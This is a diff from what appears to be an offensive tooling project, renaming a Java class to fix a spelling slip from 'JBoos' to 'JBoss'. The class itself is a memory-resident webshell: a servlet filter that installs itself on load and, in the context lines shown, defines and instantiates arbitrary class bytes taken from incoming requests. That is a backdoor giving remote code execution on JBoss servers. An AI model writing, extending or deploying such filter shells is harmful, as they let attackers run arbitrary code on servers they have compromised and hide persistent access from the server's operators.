@@ -4,7 +4,7 @@ import java.io.PrintWriter;
 import java.lang.reflect.*;
 import java.util.*;
 
-public class AesBase64JBoosFilterShell extends ClassLoader implements Filter {
+public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private static Class payloadClass;
@@ -13,19 +13,19 @@ public class AesBase64JBoosFilterShell extends ClassLoader implements Filter {
 
 
     static {
-        new AesBase64JBoosFilterShell();
+        new AesBase64JBossFilterShell();
     }
 
-    public AesBase64JBoosFilterShell(ClassLoader loader) {
+    public AesBase64JBossFilterShell(ClassLoader loader) {
         super(loader);
     }
 
-    public AesBase64JBoosFilterShell() {
+    public AesBase64JBossFilterShell() {
         synchronized (lock) {
             if (!initialized) {
                 initialized = true;
                 try {
-                    addFilter(AesBase64JBoosFilterShell.class);
+                    addFilter(AesBase64JBossFilterShell.class);
                 } catch (Throwable e) {
 
                 }
@@ -242,7 +242,7 @@ public class AesBase64JBoosFilterShell extends ClassLoader implements Filter {
                             if (loader == null) {
                                 loader = servletRequest.getClass().getClassLoader();
                             }
-                            payloadClass = new AesBase64JBoosFilterShell(loader).defineClass(data, 0, data.length);
+                            payloadClass = new AesBase64JBossFilterShell(loader).defineClass(data, 0, data.length);
                         } else {
                             java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                             Object f = payloadClass.newInstance();
